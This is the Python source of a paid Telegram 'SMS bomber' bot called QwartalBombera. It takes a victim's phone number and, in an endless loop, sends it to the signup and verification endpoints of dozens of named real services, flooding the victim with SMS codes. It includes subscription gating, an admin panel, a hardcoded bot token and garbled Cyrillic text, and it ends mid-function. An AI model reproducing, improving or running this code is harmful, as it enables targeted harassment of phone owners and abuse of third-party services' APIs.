# -*- coding: utf-8 -*-
import requests
import threading
from threading import Timer
from datetime import datetime, timedelta
from telebot import TeleBot
from threading import Thread
import telebot
import random, datetime, time
from telebot import types
from time import time
from fake_useragent import UserAgent
import re
import os
ua = UserAgent()

banner = """
- –ë–æ–ª–µ–µ 120+ —Å–µ—Ä–≤–∏—Å–æ–≤

- –°–ø–∞–º –Ω–∞ –º–Ω–æ–≥–∏–µ —Å—Ç—Ä–∞–Ω—ã (–≤ –æ—Å–Ω–æ–≤–Ω–æ–º –†–æ—Å—Å–∏—è, –ö–∞–∑–∞—Ö—Å—Ç–∞–Ω, –£–∫—Ä–∞–∏–Ω–∞ –∏ –ë–µ–ª–∞—Ä—É—Å—å)

<b>–°–∫–∏–¥–∫–∞ –Ω–∞ –ø–æ–¥–ø–∏—Å–∫—É
>> 25—Ä</b>
"""

TOKEN = '1953308157:AAGSQTeNftGEtk-eFOHfc4CjYtMD1abuYek' #1953308157:AAGSQTeNftGEtk-eFOHfc4CjYtMD1abuYek

THREADS_LIMIT = 100000

wl_file = 'numWL.txt'

chat_ids_file = 'vip_id.txt'

vip_id_file = 'vip_id.txt'

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []

def addwl(message):
    try:
        if str(message.text) in open('numWL.txt').read():
            bot.send_message(message.chat.id, f"–ù–æ–º–µ—Ä {message.text} - —É–∂–µ –µ—Å—Ç—å –≤ –±–µ–ª–æ–º –ª–∏—Å—Ç–µ")
        else:
            f = open('numWL.txt', 'a')
            f.write(str(message.text) + '\n')
            bot.send_message(message.chat.id, f"–ù–æ–º–µ—Ä {message.text} - —É—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω –≤ –±–µ–ª—ã–π –ª–∏—Å—Ç")
    except:
        bot.send_message(message.chat.id, "–û—à–∏–±–∫–∞! –í—ã –≤–≤–µ–ª–∏ –Ω–µ –Ω–æ–º–µ—Ä!")

def delllwl(message):
	with open("numWL.txt", "r") as f:
		lines = f.readlines()
	with open("numWL.txt", "w") as f:
		for line in lines:
			if line.strip("\n") != message.text:
				f.write(line)
	bot.send_message(message.chat.id, f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {message.text} - —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω –∏–∑ –±–∞–∑—ã")

def send(url,data,headers):
    try:
        print(requests.post(url,data=data,headers=headers))
    except:
        print("<Request Error>")

def user(id):
    f = open(vip_id_file,'r')
    if str(id) in f.read():
        return "1"
    else:
        pass

def delluser(message):
    with open("vip_id.txt", "r") as f:
        lines = f.readlines()
    with open("vip_id.txt", "w") as f:
        for line in lines:
            if line.strip("\n") != message.text:
                f.write(line)
    bot.send_message(message.chat.id, f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {message.text} - —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω –∏–∑ –±–∞–∑—ã")
    bot.send_message(message.text, f"–í–∞–º –∑–∞–ø—Ä–µ—â—ë–Ω –¥–æ—Å—Ç—É–ø –∫ –±–æ—Ç—É.")

def adduser(message):
    try:
        if str(message.text) in open('vip_id.txt').read():
            bot.send_message(message.chat.id, f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {message.text} - —É–∂–µ –µ—Å—Ç—å –≤ –±–∞–∑–µ")

        else:
            f = open('vip_id.txt', 'a')
            f.write(str(message.text) + '\n')
            bot.send_message(message.chat.id, f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {message.text} - —É—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω –≤ –±–∞–∑—É")
            bot.send_message(message.text, f'–°–ø–∞—Å–∏–±–æ –∑–∞ –ø–æ–∫—É–ø–∫—É - –Ω–∞–ø–∏—à–∏—Ç–µ /start\n\n–£–¥–∞—á–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è, –∏ –Ω–µ —à–∞–ª–∏—Ç–µ!')
    except:
        bot.send_message(message.chat.id, "–û—à–∏–±–∫–∞! –í—ã –≤–≤–µ–ª–∏ –Ω–µ –∞–π–¥–∏ —é–∑–µ—Ä–∞")

def save_chat_id(chat_id):
    "–§—É–Ω–∫—Ü–∏—è –¥–æ–±–∞–≤–ª—è–µ—Ç —á–∞—Ç –∞–π–¥–∏ –≤ —Ñ–∞–π–ª –µ—Å–ª–∏ –µ–≥–æ —Ç–∞–º –Ω–µ—Ç—É"
    chat_id = str(chat_id)
    with open(chat_ids_file,"a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return

def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(vip_id_file, "r") as vip_file:
        vip_list = [line.split('\n')[0] for line in vip_file]

    [send_message(chat_id) for chat_id in vip_list]

@bot.message_handler(commands=["start"])
def start(m):
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="üî±FLOODINGüî±", callback_data="button1")
    button3 = types.InlineKeyboardButton(text="‚öôÔ∏è–ù–∞—Å—Ç—Ä–æ–π–∫–∏", callback_data="button2")
    adminka = types.InlineKeyboardButton(text="–ê–¥–º–∏–Ω–∫–∞", callback_data="adminka1")

    if str(m.chat.id) in open('adm.txt').read():
        keyboard.add(button1)
        keyboard.add(button3)
        keyboard.add(adminka)
        bot.send_message(m.chat.id, f'<b>‚ú¥QwartalBombera‚ú¥\n\n</b>‚ö†Ô∏è–í—ã –≤–æ—à–ª–∏ –≤ –∞–¥–º–∏–Ω–∫—É –±–æ—Ç–∞!\n<b>–í–∞—à ID: {m.chat.id}\n\n–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ: </b>', reply_markup = keyboard, parse_mode='HTML')
    
    elif str(m.chat.id) in open('vip_id.txt').read():
        keyboard.add(button1)
        keyboard.add(button3)
        bot.send_message(m.chat.id, f'<b>‚ú¥QwartalBombera‚ú¥\n\n</b>–í—ã –∏–º–µ–µ—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –ø—Ä–∏–≤–∞—Ç–Ω–æ–º—É –±–æ—Ç—É.\n<b>–í–∞—à ID: {m.chat.id}\n\n–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ: </b>', reply_markup = keyboard, parse_mode='HTML')
    else:
        keyboard = types.InlineKeyboardMarkup()
        button5 = types.InlineKeyboardButton(text="–ü–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø", callback_data="button5")
        keyboard.add(button5)
        bot.send_message(m.chat.id, '<b>‚ú¥QwartalBombera‚ú¥</b>\n\n‚ùóÔ∏è –£ –≤–∞—Å –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –ø–ª–∞—Ç–Ω–∞—è –ø–æ–¥–ø–∏—Å–∫–∞ –Ω–∞ –±–æ—Ç–∞. –ß—Ç–æ–±—ã –µ–µ –ø—Ä–∏–æ–±—Ä–µ—Å—Ç–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É üëâüèª–ü–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–øüëàüèª.',  reply_markup=keyboard, parse_mode='HTML')

def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="–û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–ø–∞–º", callback_data="button3")
    keyboard.add(button1)
    if "1" == user(chat_id):
        msg = f'‚ö†–°–ø–∞–º –∑–∞–ø—É—â–µ–Ω –Ω–∞ 7 –¥–Ω–µ–π –¥–ª—è –Ω–æ–º–µ—Ä–∞ -> +{phone_number}!'
        bot.send_message(chat_id, msg, reply_markup=keyboard)
        while chat_id in running_spams_per_chat_id:
            send_for_number(phone_number)

        THREADS_AMOUNT[0] -= 1
        try:
            running_spams_per_chat_id.remove(chat_id)
        except Exception:
            pass
        
    else:
        msg = f'<b>‚ö†–°–ø–∞–º –∑–∞–ø—É—â–µ–Ω –Ω–∞ 7 –¥–Ω–µ–π –¥–ª—è –Ω–æ–º–µ—Ä–∞ -> +{phone_number}!</b>'

        bot.send_message(chat_id, msg, reply_markup=keyboard, parse_mode='HTML')
        end = datetime.now() + timedelta(minutes = 1)

        while datetime.now() < end and chat_id in running_spams_per_chat_id:
            send_for_number(phone_number)    
        try:
            running_spams_per_chat_id.remove(chat_id)
        except Exception:
            pass

def send_for_number(_phone):
    if _phone[0] == '+':
        _phone = _phone[1:]
    if _phone[0] == '8':
        _phone = '7'+_phone[1:]
    if _phone[0] == '9':
        _phone = '7'+_phone
    
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    iteration = 0
    phone = _phone
    _phone9 = _phone[1:]
    _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
    _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
    _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
    _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
    _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
    _phone = _phone
    _email = _name+f'{iteration}'+'@gmail.com'
    email = _name+f'{iteration}'+'@gmail.com'
    request_timeout = 0.00001
    while True:
        phone1 = '+'+phone[0]+' '+'('+phone[1]+phone[2]+phone[3]+')'+" "+phone[4]+phone[5]+phone[6]+'-'+phone[7]+phone[8]+'-'+phone[9]+phone[10]
        phone2 = phone[1] + phone[2] + phone[3] + phone[4] + phone[5] + phone[6] + phone[7] + phone [8] + phone[9] + phone[10] 
        
        try:    
         requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone})
        except Exception as e:
         pass
       
        try:                                                
         requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + phone})
        except Exception as e:
         pass
       
        try:    
         requests.post("https://api.mtstv.ru/v1/users", data={'msisdn': phone})
        except Exception as e:
         pass
       
        try:
         a=requests.get('https://driver.gett.ru/signup/')
         requests.post('https://driver.gett.ru/api/login/phone/', data = {'phone':phone,'registration':'true'}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'csrftoken='+a.cookies['csrftoken']+'; _ym_uid=1547234164718090157; _ym_d=1547234164; _ga=GA1.2.2109386105.1547234165; _ym_visorc_46241784=w; _gid=GA1.2.1423572947.1548099517; _gat_gtag_UA_107450310_1=1; _ym_isad=2','Host':'driver.gett.ru (http://driver.gett.ru/)','Referer':'https://driver.gett.ru/signup/','User-Agent':'Mozilla/5.0 (https://driver.gett.ru/signup/','User-Agent':'Mozilla/5.0) (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-CSRFToken':a.cookies['csrftoken']})
        except Exception as e:
         pass
       
        try:    
         requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', data = {"phone":phone}, headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.ivi.ru (http://api.ivi.ru/)', 'origin':'https://www.ivi.ru/','Referer':'https://www.ivi.ru/profile (https://www.ivi.ru/','Referer':'https://www.ivi.ru/profile)'})
        except:
         pass
       
       
        try:
         b = requests.session()
         b.get('https://drugvokrug.ru/siteActions/processSms.htm')
         requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data = {'cell':phone}, headers = {'Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'JSESSIONID='+b.cookies['JSESSIONID']+';','Host':'drugvokrug.ru (http://drugvokrug.ru/)','Referer':'https://drugvokrug.ru/','User-Agent':'Mozilla/5.0 (https://drugvokrug.ru/','User-Agent':'Mozilla/5.0) (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
        except Exception as e:
         pass
       
       
       
        #–î–æ–±–∞–≤–ª–µ–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã
        try:
         rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone[1:]})
        except Exception as e:
         pass
       
         
        try:
         rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone})
        except Exception as e:
         pass
       
         
        try:
         psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'–ò–≤–∞–Ω','middleName':'–ò–≤–∞–Ω–æ–≤–∏—á','lastName':'–ò–≤–∞–Ω–æ–≤','sex':'1','birthDate':'10.10.2000','mobilePhone': phone[1:],'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        except Exception as e:
         pass
         
       
         
        try:
         beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
        except Exception as e:
         pass
         
       
        try:
         modulbank = requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone', json={'FirstName':'–°–∞—à–∞','CellPhone':phone[1:],'Package':'optimal'})
        except Exception as e:
         pass
       
        try:
         data = {
       
        'form[NAME]': '–ò–≤–∞–Ω',
        'form[PERSONAL_GENDER]': 'M',
        'form[PERSONAL_BIRTHDAY]': '11.02.2000',
        'form[EMAIL]': 'fbhbdfvbd@gmail.com',
        'form[LOGIN]': phone1,
        'form[PASSWORD]': None,
        'get-new-password': '–ü–æ–ª—É—á–∏—Ç–µ –ø–∞—Ä–æ–ª—å –ø–æ SMS',
        'user_agreement': 'on',
        'personal_data_agreement': 'on',
        'formType': 'full',
        'utc_offset': 180}
        
         aptkru = requests.post('https://apteka.ru/_action/auth/getForm/', data = data)
        except Exception as e:
         pass
       
        try:
         tvzavr = requests.post('https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone='+phone+'&csrf_value=a222ba2a464543f5ac6ad097b1e92a49 (https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone=%27+phone+%27&csrf_value=a222ba2a464543f5ac6ad097b1e92a49)')
        except Exception as e:
         pass
       
       
        try:
         cook = requests.post('https://www.netprint.ru/order/profile')
       
       
         headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Length': 145,
        'Cookie':'unbi='+cook.cookies['unbi'],
        'Host': 'www.netprint.ru',
        'Origin': 'https://www.netprint.ru',
        'Referer': 'https://www.netprint.ru/order/profile',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36 OPR/65.0.3467.48',
        'X-Requested-With': 'XMLHttpRequest'}
        
       
         netprint = requests.post('https://www.netprint.ru/order/social-auth', headers = headers,   data = {'operation': 'stdreg','email_or_phone': phonew, 'i_agree_with_terms': 1})
       
        except Exception as e:
         pass
       
        try:
         requests.post('http://youdrive.today/login/web/phone', data = {'phone':phone, 'phone_code': 7})
        except Exception as e:
         pass
       
        try:
         requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+phone+'&country_code=%2B7&nod=4&locale=en')
        except Exception as e:
         pass
       
       
        try:
         requests.post("https://api.carsmile.com/",
                                      json={"operationName": "enterPhone", "variables": {"phone": phone},
                                            "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        except Exception as e:
         pass
       
       
        try:
         requests.post("https://api.delitime.ru/api/v2/signup",
                                      data={"SignupForm[username]":phone, "SignupForm[device_type]": 3})
        except Exception as e:
         pass
       
       
        try:
         requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                                      data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru',
                                            'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        except Exception as e:
         pass
       
        try:
         requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                                      data={"mode": "request", "phone": "+" + phone,
                                            "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6",
                                            "osversion": "unknown", "devicemodel": "unknown"})
        except Exception as e:
         pass
       
        try:
         password = ''.join(random.choice(string.ascii_letters) for _ in range(6))
         requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + phone})
        except Exception as e:
         pass
       
        try:
         requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',
                                      json={"phone": phone})
        except Exception as e:
         pass
       
        try:
         requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})
        except Exception as e:
         pass
       
        try:
         requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
        except Exception as e:
         pass
       
        try:
         requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                                      json={"phone": "+" + phone, "api": 2, "email": "email",
                                            "x-email": "x-email"})
        except Exception as e:
         pass
       
        try:
         requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                                      data={"st.r.phone": "+" + phone})
        except Exception as e:
         pass
        
        try:
         requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                                      json={"phone": phone})
        except Exception as e:
         pass
       
        try:
         requests.post("https://api.wowworks.ru/v2/site/send-code",
                                      json={"phone": phone, "type": 2})
        except Exception as e:
         pass
       
        try:
         requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                                      json={"phone_number": "+" + phone})
        except Exception as e:
         pass
       
        try:
         topPHONE = '+'+phone[0]+'('+phone[1]+phone[2]+phone[3]+')'+phone[4]+phone[5]+phone[6]+'-'+phone[7]+phone[8]+'-'+phone[9]+phone[10]
         topshop = requests.post('https://www.top-shop.ru/login/loginByPhone/', data = {'phone': topPHONE})
        except Exception as e:
         pass

        try:
         try:
          requests.get(f'https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone=%2B{phone}')
         except:
          requests.get(f'https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=12&callmode=1&lang=ru&phone={phone}')
        except:
         pass



def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, '–í—ã —É–∂–µ –Ω–∞—á–∞–ª–∏ —Ä–∞—Å—Å—ã–ª–∫—É —Å–ø–∞–º–∞. –î–æ–∂–¥–∏—Ç–µ—Å—å –æ–∫–æ–Ω—á–∞–Ω–∏—è –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ "–û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–ø–∞–º" –∏ –ø–æ—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞!')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        if phone not in open(wl_file).read():
            x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
            threads.append(x)
            THREADS_AMOUNT[0] += 1
            x.start()
        else:
            bot.send_message(chat_id, "–î–∞–Ω–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –ë–µ–ª–æ–º –ª–∏—Å—Ç–µ. –í—ã –Ω–µ —Å–º–æ–∂–µ—Ç–µ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–∞ –Ω–µ–≥–æ —Å–ø–∞–º. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –¥—Ä—É–≥–æ–π –Ω–æ–º–µ—Ä.\n\n–£–±—Ä–∞—Ç—å –Ω–æ–º–µ—Ä —Å–æ —Å–ø–∏—Å–∫–∞, –≤–æ–∑–º–æ–∂–Ω–æ - —á–µ—Ä–µ–∑ @couldistin")
    else:
        bot.send_message(chat_id, '–°–µ—Ä–≤–µ—Ä–∞ —Å–µ–π—á–∞—Å –ø–µ—Ä–µ–≥—Ä—É–∂–µ–Ω—ã. –ü–æ–ø—ã—Ç–∞–π—Ç–µ—Å—å —Å–Ω–æ–≤–∞ —á–µ—Ä–µ–∑ –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–∏–Ω—É—Ç!')
        print('–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ç—Ä–µ–¥–æ–≤ –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è. –î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ!')

@bot.message_handler(content_types=['text'])
def handle_message_received(message):

#############################################################################################
    chat_id = int(message.chat.id)
    text = message.text
    if '–†–ê–ó–û–°–õ–ê–¢–¨: ' in text and str(chat_id) in open('adm.txt').read():
        msg = text.replace("–†–ê–ó–û–°–õ–ê–¢–¨: ","")
        send_message_users(msg)

    elif len(text) == 11 and str(chat_id) in open('vip_id.txt').read():
        phone = text
        spam_handler(phone, chat_id, force=False)
    elif len(text) == 12 and str(chat_id) in open('vip_id.txt').read():
        phone = text
        spam_handler(phone, chat_id, force=False)
    else:
        bot.send_message(chat_id, '–ù–æ–º–µ—Ä –≤–≤–µ–¥–µ–Ω –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ.')

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    message = call.message





    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="üî±FLOODINGüî±", callback_data="button1")
    button3 = types.InlineKeyboardButton(text="‚öôÔ∏è–ù–∞—Å—Ç—Ä–æ–π–∫–∏", callback_data="button2")
    adminka = types.InlineKeyboardButton(text="–ê–¥–º–∏–Ω–∫–∞", callback_data="adminka1")

    if str(message.chat.id) in open('adm.txt').read():
        keyboard.add(button1)
        keyboard.add(button3)
        keyboard.add(adminka)
        bot.send_message(message.chat.id, f'<b>‚ú¥QwartalBombera‚ú¥\n\n</b>‚ö†Ô∏è–í—ã –≤–æ—à–ª–∏ –≤ –∞–¥–º–∏–Ω–∫—É –±–æ—Ç–∞!\n<b>–í–∞—à ID: {message.chat.id}\n\n–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ: </b>', reply_markup = keyboard, parse_mode='HTML')
    
    elif str(message.chat.id) in open('vip_id.txt').read():
        keyboard.add(button1)
        keyboard.add(button3)
        bot.send_message(message.chat.id, f'<b>‚ú¥QwartalBombera‚ú¥\n\n</b>–í—ã –∏–º–µ–µ—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –ø—Ä–∏–≤–∞—Ç–Ω–æ–º—É –±–æ—Ç—É.\n<b>–í–∞—à ID: {message.chat.id}\n\n–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ: </b>', reply_markup = keyboard, parse_mode='HTML')
    else:
        keyboard = types.InlineKeyboardMarkup()
        button5 = types.InlineKeyboardButton(text="–ü–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø", callback_data="button5")
        keyboard.add(button5)
        bot.send_message(message.chat.id, '<b>‚ú¥QwartalBombera‚ú¥</b>\n\n‚ùóÔ∏è –£ –≤–∞—Å –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –ø—Ä–∏–≤–∞—Ç–Ω–∞—è –≤–µ—Ä—Å–∏—è –±–æ—Ç–∞. –ß—Ç–æ–±—ã –µ–µ –ø—Ä–∏–æ–±–µ—Ä—Å—Ç–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫–∞ üëâüèª–ü–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–øüëàüèª.',  reply_markup=keyboard, parse_mode='HTML')
##########################################################################################
    if call.message:
        if call.data == "button1":
            bot.send_message(message.chat.id, '<b>–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –±–µ–∑ + –≤ —Ñ–æ—Ä–º–∞—Ç–µ</b>:\nüá∫üá¶ 380xxxxxxxxx\nüá∑üá∫ 79xxxxxxxxx\nüá∞üáø 77xxxxxxxxx\nüáßüáæ 375xxxxxxxxx', parse_mode='HTML')
        elif call.data == "button3":
            if message.chat.id not in running_spams_per_chat_id:
                bot.send_message(message.chat.id, '–í—ã –µ—â–µ –Ω–µ –Ω–∞—á–∏–Ω–∞–ª–∏ —Å–ø–∞–º.')
                start(message)
            else:
                running_spams_per_chat_id.remove(message.chat.id)
                bot.send_message(message.chat.id, 'C–ø–∞–º —É—Å–ø–µ—à–Ω–æ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.')
                start(message)
##########################################################################################
        elif call.data == "button2":
            settings = types.InlineKeyboardMarkup()
            button7 = types.InlineKeyboardButton(text="–î–æ–±–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä –≤ –±–µ–ª—ã–π –ª–∏—Å—Ç", callback_data="button7")
            button8 = types.InlineKeyboardButton(text="–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è", callback_data="button8")
            button9 = types.InlineKeyboardButton(text="–û–±–Ω–æ–≤–∏—Ç—å", callback_data="button9")
            button10 = types.InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data="button10")

            settings.add(button7)
            settings.add(button8)
            settings.add(button9)
            settings.add(button10)
            bot.send_message(message.chat.id, f"–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –±–æ—Ç–∞. –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=settings)

        elif call.data == 'button8':
            bot.send_message(message.chat.id, banner, parse_mode='HTML')

        elif call.data == 'button9':
            start(message)

        elif call.data == 'button7':
            lol = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä, –∫–æ—Ç–æ—Ä—ã–π —Ö–æ—Ç–∏—Ç–µ –¥–æ–±–∞–≤–∏—Ç—å –≤ –±–µ–ª—ã–π –ª–∏—Å—Ç.")
            bot.register_next_step_handler(lol, addwl)

        elif call.data == 'button10':
            bot.send_message(message.chat.id, '–í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é.')
            start(message)
##########################################################################################
        elif call.data == 'adminka1':
            admm = types.InlineKeyboardMarkup()
            addpol = types.InlineKeyboardButton(text="–î–æ–±–∞–≤–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è", callback_data="button20")
            delpol = types.InlineKeyboardButton(text="–£–¥–∞–ª–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è", callback_data="button21")
            addwll = types.InlineKeyboardButton(text="–î–æ–±–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä –≤ –ë–µ–ª—ã–π –ª–∏—Å—Ç", callback_data="button22")
            delwll = types.InlineKeyboardButton(text="–£–¥–∞–ª–∏—Ç—å –Ω–æ–º–µ—Ä —Å –ë–µ–ª–æ–≥–æ –ª–∏—Å—Ç–∞", callback_data="button23")
            rassl = types.InlineKeyboardButton(text="–†–∞—Å—Å—ã–ª–∫–∞", callback_data="button24")
            oblov = types.InlineKeyboardButton(text="–û–±–Ω–æ–≤–∏—Ç—å –±–æ—Ç–∞", callback_data="button25")
            backb = types.InlineKeyboardButton(text="–í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥", callback_data="button26")


            admm.add(addpol, delpol)
            admm.add(addwll, delwll)
            admm.add(rassl, oblov)
            admm.add(backb)
            bot.send_message(message.chat.id, f"–ê–¥–º–∏–Ω–∫–∞ –±–æ—Ç–∞. –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=admm)

        elif call.data == 'button20':
            a = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ id –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä–æ–≥–æ —Ö–æ—Ç–∏—Ç–µ –¥–æ–±–∞–≤–∏—Ç—å –≤ –±–∞–∑—É.')
            bot.register_next_step_handler(a, adduser)

        elif call.data == 'button21':
